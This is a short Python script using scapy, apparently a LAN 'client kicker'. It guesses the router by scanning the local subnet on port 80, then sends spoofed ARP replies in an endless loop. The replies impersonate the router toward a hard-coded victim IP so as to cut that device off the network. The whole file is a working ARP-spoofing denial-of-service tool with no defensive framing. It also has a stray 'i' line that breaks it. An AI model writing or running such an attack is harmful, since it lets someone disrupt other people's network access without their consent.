from scapy.all import *
import socket
import time
def get_router_ip():
    try:

        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_socket.connect(("8.8.8.8", 80))
        local_ip = temp_socket.getsockname()[0]
        temp_socket.close()


        network_prefix = '.'.join(local_ip.split('.')[:3]) + '.'


        for i in range(1, 256):
            target_ip = network_prefix + str(i)
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.settimeout(0.1)
            result = temp_socket.connect_ex((target_ip, 80))
            temp_socket.close()


            if result == 0:
                return target_ip

        return None
    except Exception as e:
        print(f"Exception {e}")
        return None


router_ip = get_router_ip()

if router_ip:
    print("Router:", router_ip)
else:
    print("Bad gateaway")

def get_my_ip():
    try:
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        temp_socket.connect(("8.8.8.8", 80))
        ip = temp_socket.getsockname()[0]
        temp_socket.close()
        return ip
    except socket.error:
        print("Bad gateaway.")
        return None

my_ip = get_my_ip()
if my_ip:
    print("My IP:", my_ip)


i

def kick_client(target_ip, router_ip):
    try:
        while True:

            packet = Ether()/ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=router_ip)


            srp(packet, timeout=1, verbose=0)


            time.sleep(2)

    except KeyboardInterrupt:
        print("\nAttack is finished.")
    except Exception as e:
        print(f"Exception: {e}")


target_ip = "192.168.178.57"
router_ip = "192.168.178.1"

kick_client(target_ip, router_ip)